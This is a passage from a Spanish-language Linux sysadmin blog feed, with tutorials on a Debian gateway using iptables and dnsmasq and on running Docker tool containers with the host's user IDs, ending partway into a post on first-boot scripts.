&lt;p&gt;Eso convierte el contenedor principal y el contenedor &lt;em&gt;sidekick&lt;/em&gt; en un par indivisible, que actuan juntos en una relacion de simbiosis. En caso de que lo hagamos mal y no haya contenedor &lt;em&gt;sidekick&lt;/em&gt; para algún contenedor web, su contenido no se actualizaría y obtendríamos un error 404 en las páginas de ese servidor.&lt;/p&gt;</content><category term="docker"></category><category term="sidekick"></category></entry><entry><title>Un gateway con Debian, iptables y dnsmasq</title><link href="http://www.linuxsysadmin.ml/2018/03/un-gateway-con-debian-iptables-y-dnsmasq.html" rel="alternate"></link><published>2018-03-12T10:00:00+01:00</published><updated>2018-03-12T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-03-12:/2018/03/un-gateway-con-debian-iptables-y-dnsmasq.html</id><summary type="html">&lt;p&gt;En algunas ocasiones no nos basta con tener un servidor único. Queremos tener un conjunto de servidores que se comuniquen abiertamente entre ellos usando una red privada, pero solo queremos exponer al mundo una sola dirección IP. El resto de servidores necesitan acceso a internet a través de un representante …&lt;/p&gt;</summary><content type="html">&lt;p&gt;En algunas ocasiones no nos basta con tener un servidor único. Queremos tener un conjunto de servidores que se comuniquen abiertamente entre ellos usando una red privada, pero solo queremos exponer al mundo una sola dirección IP. El resto de servidores necesitan acceso a internet a través de un representante.&lt;/p&gt;
&lt;p&gt;Este representante, llamando &lt;em&gt;gateway&lt;/em&gt;, es un servidor con una interfaz en la red privada y una en la red pública, de forma que los paquetes de red puedan fluir desde cualquier servidor hasta internet a través de este representante.&lt;/p&gt;
&lt;p&gt;De forma obligatoria, un &lt;em&gt;gateway&lt;/em&gt; solo necesita hacer dos cosas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Permitir el reenvío (o &lt;em&gt;forward&lt;/em&gt;) de paquetes a través del servidor &lt;em&gt;gateway&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Enmascarar la dirección de origen mediante NAT para que los paquetes sepan como volver desde internet.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Idealmente, suelen hacer otras funciones y ofrecer servicios a sus servidores protegidos, como por ejemplo:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Funciones de &lt;em&gt;firewall&lt;/em&gt; para proteger de accesos no autorizados contra la red protegida.&lt;/li&gt;
&lt;li&gt;Servidor DHCP para asignar direcciones IP a los servidores de la red interna.&lt;/li&gt;
&lt;li&gt;Servidor DNS para que los servidores de la red interna se conozcan entre ellos.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Las 3 primeras funciones quedan fácilmente cubiertas en el mismo &lt;em&gt;kernel&lt;/em&gt; de un sistema &lt;em&gt;linux&lt;/em&gt;; los servidores DHCP y DNS se pueden añadir fácilmente con un servicio adicional llamado &lt;strong&gt;dnsmasq&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;El servidor base&lt;/h2&gt;
&lt;p&gt;Partimos de un servidor &lt;strong&gt;Debian stretch&lt;/strong&gt; con dos direcciones asignadas, una en cada red.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;enp0s3&lt;/strong&gt;: La interfaz que da al exterior, configurada como nos sea conveniente.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;enp0s8&lt;/strong&gt;: Esta es la interfaz que da a la red interna, con una dirección IP estática (en este caso 10.0.0.1/24).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: Vamos a retrasar la aplicación de todas las configuraciones hasta el final, momento en el que reiniciaremos el servidor.&lt;/p&gt;
&lt;h2&gt;Las funciones básicas: forward, masquerade y firewall&lt;/h2&gt;
&lt;p&gt;El primer paso es permitir el paso de paquetes de red a través de nuestro &lt;em&gt;gateway&lt;/em&gt;. Ello se consigue configurando los parámetros del sistema.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gateway:~# tail -1 /etc/sysctl.conf
net.ipv4.ip_forward &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
root@gateway:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El resto se consigue mediante el módulo del &lt;em&gt;kernel&lt;/em&gt; llamado &lt;em&gt;netfilter&lt;/em&gt;. La herramienta que modifican &lt;em&gt;netfilter&lt;/em&gt; se llama &lt;strong&gt;iptables&lt;/strong&gt;, y por comodidad, vamos a utilizar el paquete &lt;strong&gt;iptables-persistent&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gateway:~# apt-get install iptables-persistent
...
root@gateway:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora nos falta crear el fichero de reglas que será cargado en cada reinicio:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gateway:~# cat /etc/iptables/rules.v4
*nat
-A POSTROUTING -o enp0s3 -j MASQUERADE
COMMIT

*filter
-A INPUT -i lo -j ACCEPT
-A INPUT -i enp0s3 -p tcp -m tcp --dport &lt;span class="m"&gt;22&lt;/span&gt; -j ACCEPT
-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
-A INPUT -i enp0s3 -j DROP
COMMIT
root@gateway:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La regla de la tabla &lt;em&gt;nat&lt;/em&gt; es la que enmascara la dirección origen y pone la de salida del &lt;em&gt;gateway&lt;/em&gt;, para que los paquetes sepan volver.&lt;/p&gt;
&lt;p&gt;El resto de reglas en la tabla de &lt;em&gt;filter&lt;/em&gt; hacen la función de un &lt;em&gt;firewall&lt;/em&gt; básico, que acepta conexiones que vengan del mismo servidor, las conexiones SSH, las conexiones que ya estén establecidas o estén pasando a través y descarta todo el resto.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: Ahora solo haría falta reiniciar el servidor, pero lo retrasamos para instalar el resto de servicios.&lt;/p&gt;
&lt;h2&gt;Algunos servicios útiles: DHCP y DNS&lt;/h2&gt;
&lt;p&gt;Todos los servicios que queramos ofrecer en la red interna se hacen igual: instalar el paquete que lo proporciona y configurarlo. En este caso, el paquete &lt;strong&gt;dnsmasq&lt;/strong&gt; ofrece ambos servicios.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gateway:~# apt-get install dnsmasq
...
root@gateway:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La configuración del servicio se hace en el fichero &lt;em&gt;/etc/dnsmasq.conf&lt;/em&gt;. Sin embargo es un fichero muy largo; vamos a beneficiarnos de la carpeta &lt;em&gt;/etc/dnsmasq.d/&lt;/em&gt; para añadir nuestras configuraciones. Lo hago en dos ficheros, de forma que tengamos la configuración organizada en dos ficheros, en función de la frecuencia de modificación.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gateway:~# cat /etc/dnsmasq.d/00-base
&lt;span class="nv"&gt;interface&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;enp0s8
dhcp-range&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.200,10.0.0.250,1h
root@gateway:~# cat /etc/dnsmasq.d/01-hosts
&lt;span class="c1"&gt;#dhcp-host=server,10.0.0.2,1h&lt;/span&gt;
root@gateway:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De esta forma, cuando queramos añadir un nuevo servidor en la red interna con dirección fija, podemos configurarlo para usar DHCP, poner una nueva línea en el fichero &lt;em&gt;/etc/dnsmasq.d/01-hosts&lt;/em&gt; similar a la de comentada de arriba, y reinicar el servicio &lt;strong&gt;dnsmasq&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Como &lt;em&gt;bonus&lt;/em&gt;, el servidor &lt;em&gt;gateway&lt;/em&gt; va a poder resolver por DNS el nombre declarado por el servidor protegido, al que ya dio dirección por DHCP. Para que los servidores de la red interna puedan resolver por nombre la máquina &lt;em&gt;gateway&lt;/em&gt;, solo necesitamos añadir esa relación en el fichero &lt;em&gt;/etc/hosts&lt;/em&gt; del &lt;em&gt;gateway&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gateway:~# grep gateway /etc/hosts
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.1        gateway
root@gateway:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es importante que nuestro servidor &lt;em&gt;gateway&lt;/em&gt; utilice &lt;em&gt;localhost&lt;/em&gt; como primer DNS, de forma que se beneficie de las funciones &lt;em&gt;DNS cache&lt;/em&gt; y pueda resolver los servidores de la red interna por su nombre. Esto se hace poniendo &lt;em&gt;127.0.0.1&lt;/em&gt; en el fichero &lt;em&gt;/etc/resolv.conf&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Como configuré la interfaz principal por DHCP y el fichero &lt;em&gt;/etc/resolv.conf&lt;/em&gt; se sobreescribe de forma automática, podemos instruir el cliente DHCP para que lo incluya antes de los que reciba por DHCP.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gateway:~# tail -1 /etc/dhcp/dhclient.conf
prepend domain-name-servers &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="p"&gt;;&lt;/span&gt;
root@gateway:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Aplicar los cambios&lt;/h2&gt;
&lt;p&gt;En este punto podemos reiniciar el servidor, para que apliquen todos los cambios.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gateway:~# reboot
...
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Añadir un servidor en la red interna&lt;/h2&gt;
&lt;p&gt;Un servidor que se quiera unir a la red puede hacerlo con una dirección estática, pero es mas fácil hacerlo por DHCP; basta con tenerlo configurado para usar DHCP.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Si clonamos una máquina virtual, es necesario asegurarse que la dirección MAC de la interfaz cambia, ya que la relación entre el servidor y su IP se guarda usando la dirección MAC, y por lo tanto, no deben haber dos iguales.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Podemos eliminar la relación &lt;em&gt;localhost&lt;/em&gt; del servidor con su nombre en &lt;em&gt;/etc/hosts&lt;/em&gt;; &lt;strong&gt;dnsmasq&lt;/strong&gt; resuelve eso por nosotros y para otros servidores de la red.&lt;/p&gt;
&lt;p&gt;Si queremos que tenga una dirección fija, se puede hacer fácilmente. Necesitamos configurar el servidor DHCP para que asigne una IP concreta basándonos en el nombre del servidor, y recargar este servicio.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gateway:~# cat /etc/dnsmasq.d/01-hosts
dhcp-host&lt;span class="o"&gt;=&lt;/span&gt;database,10.0.0.5,1h
root@gateway:~# service dnsmasq restart
root@gateway:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo faltará darle un nombre al servidor candidato en en &lt;em&gt;/etc/hostname&lt;/em&gt; y reiniciarlo. Tanto la dirección IP, el &lt;em&gt;gateway&lt;/em&gt; por defecto y el servidor DNS se cargan en la resolución DHCP.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="stretch"></category><category term="gateway"></category><category term="iptables"></category><category term="dnsmasq"></category></entry><entry><title>Entornos de trabajo en contenedores Docker</title><link href="http://www.linuxsysadmin.ml/2018/03/entornos-de-trabajo-en-contenedores-docker.html" rel="alternate"></link><published>2018-03-05T10:00:00+01:00</published><updated>2018-03-05T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-03-05:/2018/03/entornos-de-trabajo-en-contenedores-docker.html</id><summary type="html">&lt;p&gt;Cuando usamos herramientas concretas para todos los miembros de un mismo equipo, suele ser problemático instalarlo en sus equipos. Por la ausencia de instalación y su gran reproducibilidad, es cada vez más frecuente distribuir esas herramientas en una imagen de &lt;strong&gt;Docker&lt;/strong&gt;, aunque esto no garantiza estar libres de otros problemas …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando usamos herramientas concretas para todos los miembros de un mismo equipo, suele ser problemático instalarlo en sus equipos. Por la ausencia de instalación y su gran reproducibilidad, es cada vez más frecuente distribuir esas herramientas en una imagen de &lt;strong&gt;Docker&lt;/strong&gt;, aunque esto no garantiza estar libres de otros problemas.&lt;/p&gt;
&lt;p&gt;El tema más problemático suele ser la diferencia entre el usuario del equipo y el del contenedor &lt;strong&gt;Docker&lt;/strong&gt;; un fichero guardado con el usuario &lt;em&gt;john&lt;/em&gt; en el contenedor pasaria a pertenecer, por ejemplo, al usuario &lt;em&gt;james&lt;/em&gt; en el &lt;em&gt;host&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Esto se debe a que el usuario se guarda en el disco como su identificador numérico, que luego se interpreta de acuerdo al fichero &lt;em&gt;/etc/passwd&lt;/em&gt; del sistema operativo que lo lea. Afortunadamente, este es un problema menor que puede ser solventado con un poco de habilidad.&lt;/p&gt;
&lt;h2&gt;Un ejemplo práctico: un contenedor para usar Python&lt;/h2&gt;
&lt;p&gt;Hay pocos motivos para no instalar &lt;strong&gt;python&lt;/strong&gt; directamente en el sistema &lt;em&gt;host&lt;/em&gt;; para su fácil distribución, para utilizar diferentes versiones o simplemente para disponer de ellas en un servidor donde no podríamos instalarlo normalmente por seguridad. Sin embargo es un ejemplo con alto valor didáctico.&lt;/p&gt;
&lt;p&gt;Empezaremos con una imagen que solo contenga los binarios que usamos habitualmente; vamos a montar la carpeta de trabajo desde el &lt;em&gt;host&lt;/em&gt; de &lt;strong&gt;docker&lt;/strong&gt;. Los binarios que suelo utilizar son los siguientes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;python&lt;/li&gt;
&lt;li&gt;virtualenv&lt;/li&gt;
&lt;li&gt;pep8&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Así pues, nos limitaremos a utilizar un &lt;em&gt;Dockerfile&lt;/em&gt; básico con estas tres herramientas, y la distribución que más nos guste:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/pyenv$ cat Dockerfile
FROM alpine:3.6
RUN apk add --no-cache py-virtualenv py-pep8
gerard@atlantis:~/projects/pyenv$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: No se indica &lt;strong&gt;python&lt;/strong&gt; ya que es una dependencia de los otros paquetes.&lt;/p&gt;
&lt;h3&gt;El problema&lt;/h3&gt;
&lt;p&gt;Vamos a trabajar un poco con las nuevas herramientas, aunque solo sea para crear un proyecto vacío:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/pyenv$ docker run -ti --rm --volume /home/gerard/projects/pyenv/workspace:/workspace pyenv
/ &lt;span class="c1"&gt;# adduser -u 1200 gerard&lt;/span&gt;
Changing password &lt;span class="k"&gt;for&lt;/span&gt; gerard
New password:
Bad password: similar to username
Retype password:
passwd: password &lt;span class="k"&gt;for&lt;/span&gt; gerard changed by root
/ &lt;span class="c1"&gt;# cd workspace/&lt;/span&gt;
/workspace &lt;span class="c1"&gt;# echo &amp;#39;&amp;#39; &amp;gt; app.py&lt;/span&gt;
/workspace &lt;span class="c1"&gt;# su - gerard&lt;/span&gt;
4bf4f4abe9e2:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; /workspace/
4bf4f4abe9e2:/workspace$ virtualenv env
Traceback &lt;span class="o"&gt;(&lt;/span&gt;most recent call last&lt;span class="o"&gt;)&lt;/span&gt;:
  File &lt;span class="s2"&gt;&amp;quot;/usr/bin/virtualenv&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;11&lt;/span&gt;, in &amp;lt;module&amp;gt;
    load_entry_point&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;virtualenv==15.1.0&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;console_scripts&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;virtualenv&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)()&lt;/span&gt;
  File &lt;span class="s2"&gt;&amp;quot;/usr/lib/python2.7/site-packages/virtualenv.py&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;713&lt;/span&gt;, in main
    &lt;span class="nv"&gt;symlink&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;options.symlink&lt;span class="o"&gt;)&lt;/span&gt;
  File &lt;span class="s2"&gt;&amp;quot;/usr/lib/python2.7/site-packages/virtualenv.py&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;925&lt;/span&gt;, in create_environment
    &lt;span class="nv"&gt;site_packages&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;site_packages, &lt;span class="nv"&gt;clear&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;clear, &lt;span class="nv"&gt;symlink&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;symlink&lt;span class="o"&gt;))&lt;/span&gt;
  File &lt;span class="s2"&gt;&amp;quot;/usr/lib/python2.7/site-packages/virtualenv.py&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;1110&lt;/span&gt;, in install_python
    mkdir&lt;span class="o"&gt;(&lt;/span&gt;lib_dir&lt;span class="o"&gt;)&lt;/span&gt;
  File &lt;span class="s2"&gt;&amp;quot;/usr/lib/python2.7/site-packages/virtualenv.py&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;323&lt;/span&gt;, in mkdir
    os.makedirs&lt;span class="o"&gt;(&lt;/span&gt;path&lt;span class="o"&gt;)&lt;/span&gt;
  File &lt;span class="s2"&gt;&amp;quot;/usr/lib/python2.7/os.py&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;150&lt;/span&gt;, in makedirs
    makedirs&lt;span class="o"&gt;(&lt;/span&gt;head, mode&lt;span class="o"&gt;)&lt;/span&gt;
  File &lt;span class="s2"&gt;&amp;quot;/usr/lib/python2.7/os.py&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;150&lt;/span&gt;, in makedirs
    makedirs&lt;span class="o"&gt;(&lt;/span&gt;head, mode&lt;span class="o"&gt;)&lt;/span&gt;
  File &lt;span class="s2"&gt;&amp;quot;/usr/lib/python2.7/os.py&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;157&lt;/span&gt;, in makedirs
    mkdir&lt;span class="o"&gt;(&lt;/span&gt;name, mode&lt;span class="o"&gt;)&lt;/span&gt;
OSError: &lt;span class="o"&gt;[&lt;/span&gt;Errno &lt;span class="m"&gt;13&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; Permission denied: &lt;span class="s1"&gt;&amp;#39;/workspace/env&amp;#39;&lt;/span&gt;
4bf4f4abe9e2:/workspace$ &lt;span class="nb"&gt;exit&lt;/span&gt;
/workspace &lt;span class="c1"&gt;# exit&lt;/span&gt;
gerard@atlantis:~/projects/pyenv$ tree -ug
.
├── &lt;span class="o"&gt;[&lt;/span&gt;gerard   gerard  &lt;span class="o"&gt;]&lt;/span&gt;  workspace
│   └── &lt;span class="o"&gt;[&lt;/span&gt;root     root    &lt;span class="o"&gt;]&lt;/span&gt;  app.py
└── &lt;span class="o"&gt;[&lt;/span&gt;gerard   gerard  &lt;span class="o"&gt;]&lt;/span&gt;  Dockerfile

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;2&lt;/span&gt; files
gerard@atlantis:~/projects/pyenv$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si trabajamos como &lt;em&gt;root&lt;/em&gt;, el fichero del &lt;em&gt;host&lt;/em&gt; queda con el propietario incorrecto, y si usamos un usuario con el mismo nombre, no tenemos garantias de que casen, siendo el caso peor el de no poder escribir en el entorno de trabajo.&lt;/p&gt;
&lt;p&gt;En mi caso, el usuario &lt;em&gt;gerard&lt;/em&gt; en el &lt;em&gt;host&lt;/em&gt; tiene identificador 1000, y he creado el usuario &lt;em&gt;gerard&lt;/em&gt; del contenedor con identificador 1200 adrede para que se evidencie el problema.&lt;/p&gt;
&lt;h3&gt;La solución&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Docker&lt;/strong&gt; nos ofrece una solución muy interesante: podemos ejecutar un contenedor especificando el usuario, sea en modo texto o en modo numérico. Como en mi caso el usuario &lt;em&gt;gerard&lt;/em&gt; tiene identificador 1000 y el grupo &lt;em&gt;gerard&lt;/em&gt; también, basta con indicar el &lt;em&gt;flag&lt;/em&gt; &lt;code&gt;-u 1000:1000&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/pyenv/workspace$ docker run -ti --rm --volume /home/gerard/projects/pyenv/workspace:/workspace -u &lt;span class="m"&gt;1000&lt;/span&gt;:1000 pyenv
/ $ &lt;span class="nb"&gt;cd&lt;/span&gt; workspace/
/workspace $ &lt;span class="nb"&gt;echo&lt;/span&gt; aaa &amp;gt; run.py
/workspace $ virtualenv env
New python executable in /workspace/env/bin/python2
Also creating executable in /workspace/env/bin/python
Installing setuptools, pip, wheel...done.
/workspace $ ls -lh
total &lt;span class="m"&gt;8&lt;/span&gt;
drwxr-xr-x    &lt;span class="m"&gt;5&lt;/span&gt; &lt;span class="m"&gt;1000&lt;/span&gt;     &lt;span class="m"&gt;1000&lt;/span&gt;        &lt;span class="m"&gt;4&lt;/span&gt;.0K Nov &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="m"&gt;16&lt;/span&gt;:23 env
-rw-r--r--    &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;1000&lt;/span&gt;     &lt;span class="m"&gt;1000&lt;/span&gt;           &lt;span class="m"&gt;4&lt;/span&gt; Nov &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="m"&gt;16&lt;/span&gt;:23 run.py
/workspace $ &lt;span class="nb"&gt;exit&lt;/span&gt;
gerard@atlantis:~/projects/pyenv/workspace$ ls -lh
total &lt;span class="m"&gt;8&lt;/span&gt;,0K
drwxr-xr-x &lt;span class="m"&gt;5&lt;/span&gt; gerard gerard &lt;span class="m"&gt;4&lt;/span&gt;,0K nov &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="m"&gt;17&lt;/span&gt;:23 env
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard    &lt;span class="m"&gt;4&lt;/span&gt; nov &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="m"&gt;17&lt;/span&gt;:23 run.py
gerard@atlantis:~/projects/pyenv/workspace$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Podemos usar el comando &lt;strong&gt;id&lt;/strong&gt; para sacar ambos valores numéricos de forma automatizable.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/pyenv/workspace$ docker run -ti --rm --volume /home/gerard/projects/pyenv/workspace:/workspace -u &lt;span class="k"&gt;$(&lt;/span&gt;id -u&lt;span class="k"&gt;)&lt;/span&gt;:&lt;span class="k"&gt;$(&lt;/span&gt;id -g&lt;span class="k"&gt;)&lt;/span&gt; pyenv
/ $ id
&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1000&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1000&lt;/span&gt;
/ $
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto los identificadores cuadran y no tenemos más problemas, aunque el identificador 1000 no se asocia con ningún usuario del contendor y se lista en modo numerico. La relación entre el valor numérico y nombre del usuario está en el fichero &lt;em&gt;/etc/passwd&lt;/em&gt; y el del grupo en &lt;em&gt;/etc/group&lt;/em&gt;; podemos simplemente mapear esos ficheros del &lt;em&gt;host&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/pyenv/workspace$ docker run -ti --rm -v /home/gerard/projects/pyenv/workspace:/workspace -u &lt;span class="k"&gt;$(&lt;/span&gt;id -u&lt;span class="k"&gt;)&lt;/span&gt;:&lt;span class="k"&gt;$(&lt;/span&gt;id -g&lt;span class="k"&gt;)&lt;/span&gt; -v /etc/passwd:/etc/passwd -v /etc/group:/etc/group pyenv
/ $ ls workspace/ -lh
total &lt;span class="m"&gt;8&lt;/span&gt;
drwxr-xr-x    &lt;span class="m"&gt;5&lt;/span&gt; gerard   gerard      &lt;span class="m"&gt;4&lt;/span&gt;.0K Nov &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="m"&gt;16&lt;/span&gt;:23 env
-rw-r--r--    &lt;span class="m"&gt;1&lt;/span&gt; gerard   gerard         &lt;span class="m"&gt;4&lt;/span&gt; Nov &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="m"&gt;16&lt;/span&gt;:23 run.py
/ $
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos quedaría encapsular esa línea de comandos en un script para su fácil invocación, por ejemplo mapeando la carpeta actual al &lt;em&gt;workspace&lt;/em&gt; del contenedor, de la siguiente forma:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/newproject$ cat /home/gerard/bin/pyenv
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

docker run -ti --rm &lt;span class="se"&gt;\&lt;/span&gt;
  --user &lt;span class="k"&gt;$(&lt;/span&gt;id -u&lt;span class="k"&gt;)&lt;/span&gt;:&lt;span class="k"&gt;$(&lt;/span&gt;id -g&lt;span class="k"&gt;)&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
  --volume /etc/passwd:/etc/passwd:ro &lt;span class="se"&gt;\&lt;/span&gt;
  --volume /etc/group:/etc/group:ro &lt;span class="se"&gt;\&lt;/span&gt;
  --read-only &lt;span class="se"&gt;\&lt;/span&gt;
  --volume &lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;:/workspace &lt;span class="se"&gt;\&lt;/span&gt;
  --workdir /workspace &lt;span class="se"&gt;\&lt;/span&gt;
  pyenv
gerard@atlantis:~/projects/newproject$
&lt;/pre&gt;&lt;/div&gt;</content><category term="docker"></category><category term="herramientas"></category><category term="workspace"></category></entry><entry><title>Configurando servidores con first time boot scripts</title><link href="http://www.linuxsysadmin.ml/2018/02/configurando-servidores-con-first-time-boot-scripts.html" rel="alternate"></link><published>2018-02-26T10:00:00+01:00</published><updated>2018-02-26T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-02-26:/2018/02/configurando-servidores-con-first-time-boot-scripts.html</id><summary type="html">&lt;p&gt;Configurar servidores desde cero es una tarea muy pesada, una fuente de errores innecesaria y hace nuestros servidores difícilmente reproducibles. Los &lt;em&gt;setups&lt;/em&gt; más básicos son siempre los mismos, y podemos configurar nuestros servidores para que ejecuten un &lt;em&gt;script&lt;/em&gt; la primera vez que se (re)inicien, a falta de mejores herramientas …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Configurar servidores desde cero es una tarea muy pesada, una fuente de errores innecesaria y hace nuestros servidores difícilmente reproducibles. Los &lt;em&gt;setups&lt;/em&gt; más básicos son siempre los mismos, y podemos configurar nuestros servidores para que ejecuten un &lt;em&gt;script&lt;/em&gt; la primera vez que se (re)inicien, a falta de mejores herramientas.&lt;/p&gt;
&lt;p&gt;De esta forma, podemos disponer fácilmente de un servidor de un tipo predefinido, especialmente en aquellos &lt;em&gt;hostings&lt;/em&gt; que nos permitan &lt;em&gt;scripts&lt;/em&gt; de inicialización, como por ejemplo, &lt;a href="https://www.vultr.com/?ref=7251515"&gt;Vultr&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;El truco consiste en hacer que nuestro sistema de &lt;em&gt;init&lt;/em&gt; ejecute nuestro &lt;em&gt;script&lt;/em&gt;, solamente en el caso de que no se haya ejecutado ya. Para ello podemos usar el mismo fichero de &lt;em&gt;log&lt;/em&gt; de la ejecución efectuada.&lt;/p&gt;
&lt;h2&gt;Un ejemplo con systemd&lt;/h2&gt;
&lt;p&gt;De acuerdo a la documentación de &lt;strong&gt;systemd&lt;/strong&gt;, existe un fichero que se ejecuta en cada &lt;em&gt;boot&lt;/em&gt;, suponiendo que exista y que tenga los permisos adecuados. Se trata de &lt;em&gt;/etc/rc.local&lt;/em&gt;. Nos bastaría con crearlo y asignarle permisos de ejecución, y tendríamos el &lt;em&gt;script&lt;/em&gt; ejecutándose en cada &lt;em&gt;boot&lt;/em&gt;.&lt;/p&gt;
&lt;h3&gt;El lanzador&lt;/h3&gt;
